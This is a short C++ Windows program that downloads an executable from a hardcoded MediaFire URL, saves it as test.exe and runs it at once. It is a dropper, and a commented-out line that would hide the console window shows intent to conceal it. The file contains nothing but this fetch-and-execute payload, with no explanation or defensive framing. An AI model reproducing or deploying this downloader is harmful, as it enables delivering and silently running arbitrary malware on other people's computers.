#include <Windows.h>
#include <WinInet.h>
#include <vector>

#pragma comment(lib,"wininet")
#pragma warning(disable : 4996)

char* download_file_and_run(const char* szUrl)
{

	HINTERNET hOpen = InternetOpenA("", NULL, NULL, NULL, NULL);
	if (!hOpen) return NULL;

	HINTERNET hFile = InternetOpenUrlA(hOpen, szUrl, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE, NULL);
	if (!hFile) {
		InternetCloseHandle(hOpen);
		return NULL;
	}

	std::vector<char> tempdata;
	char* data = NULL;
	DWORD dwBytesRead = 0;

	do 
	{
		char buffer[1024];
		InternetReadFile(hFile, buffer, _countof(buffer), &dwBytesRead);
		for (unsigned int i = 0; i < dwBytesRead; i++) 
		{
			tempdata.push_back(buffer[i]);
		}
	} while (dwBytesRead);

	data = new char[tempdata.size()];
	for (unsigned int i = 0; i < tempdata.size(); i++) 
	{
		data[i] = tempdata[i];
	}

	InternetCloseHandle(hFile);
	InternetCloseHandle(hOpen);


	if (data)
	{

		HANDLE hFile = CreateFileA("test.exe", GENERIC_READ | GENERIC_WRITE, 0,
						NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		WriteFile(hFile, data, tempdata.size(), &dwBytesRead, NULL);

		CloseHandle(hFile);


		STARTUPINFOA si;
		PROCESS_INFORMATION pi;

		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		if (!CreateProcessA("test.exe", NULL, NULL, NULL,
			FALSE, 0, NULL, NULL, &si, &pi))
			printf("CreateProcess failed.");

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
}

void main()
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	const char url[] = "https://download1497.mediafire.com/0jbzzatdp5dg/v4r9dopozhy5n3p/test.exe";
	download_file_and_run(url);
#ifdef _DEBUG
	system("pause");
#endif
}